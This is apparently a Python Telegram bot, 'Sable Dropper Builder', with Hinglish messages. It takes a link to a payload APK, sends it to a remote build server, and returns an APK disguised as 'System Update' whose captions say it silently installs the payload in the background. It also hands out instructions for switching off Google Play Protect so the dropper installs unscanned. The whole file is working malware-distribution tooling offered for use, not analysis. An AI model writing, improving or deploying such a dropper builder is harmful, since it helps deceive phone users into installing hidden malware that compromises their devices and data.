import os
import logging
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

BOT_TOKEN = os.environ.get("BOT_TOKEN")
RENDER_URL = os.environ.get("RENDER_URL")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("🚀 Build Dropper APK", callback_data="build")],
        [InlineKeyboardButton("🛡️ Bypass Play Protect", callback_data="bypass")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "🔥 **Welcome to Sable Dropper Builder** 🔥\n\n"
        "Mujhe payload ka direct download link bhej, main ek naya APK bana dunga jo background me chupke se payload install karega.",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data == "build":
        await query.edit_message_text("📥 **Payload APK ka direct link bhej...**", parse_mode='Markdown')
        context.user_data['waiting_for_url'] = True
    elif query.data == "bypass":
        await query.edit_message_text("🛡️ **Play Protect Bypass Guide:**\n\n"
                                      "1. Play Store > Profile > Play Protect > Settings (Gear).\n"
                                      "2. 'Scan apps with Play Protect' ko OFF kar do.\n"
                                      "3. APK install karo.\n"
                                      "4. Install ke baad Play Protect wapas ON kar lena.", parse_mode='Markdown')

async def handle_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('waiting_for_url'):
        return

    payload_url = update.message.text.strip()
    if not payload_url.startswith("http"):
        await update.message.reply_text("❌ Ye sahi link nahi lag raha. Kripya direct download link bhej.")
        return

    context.user_data['waiting_for_url'] = False
    progress_msg = await update.message.reply_text("⏳ **Dropper APK ban raha hai...**\nThoda wait karo.", parse_mode='Markdown')

    try:
        server_endpoint = f"{RENDER_URL}/generate" if RENDER_URL.endswith("/") else f"{RENDER_URL}/generate"
        
        response = requests.post(server_endpoint, json={
            "payload_url": payload_url,
            "app_name": "System Update" # Yahan naam badal sakta hai
        }, timeout=300)

        if response.status_code == 200:
            await progress_msg.edit_text("✅ **APK Ready Hai!**", parse_mode='Markdown')
            
            await update.message.reply_document(
                document=response.content,
                filename="System_Update.apk",
                caption=(
                    "🔥 **Standalone Dropper Ready!**\n\n"
                    "**Install Karne Ka Tarika:**\n"
                    "1. Play Store > Profile > Play Protect > Settings (Gear).\n"
                    "2. 'Scan apps with Play Protect' ko OFF kar do.\n"
                    "3. Ye APK install karo.\n"
                    "4. Install hote hi ye background me tera payload install kar dega."
                ),
                parse_mode='Markdown'
            )
            await progress_msg.delete()
        else:
            try:
                error_data = response.json()
                error_msg = error_data.get("error", response.text)
            except:
                error_msg = response.text
            
            await progress_msg.edit_text(f"❌ **Server Error:**\n`{error_msg[:200]}`", parse_mode='Markdown')

    except Exception as e:
        await progress_msg.edit_text(f"❌ **Error aaya:**\n`{str(e)}`", parse_mode='Markdown')

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_url))
    print("Standalone Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()
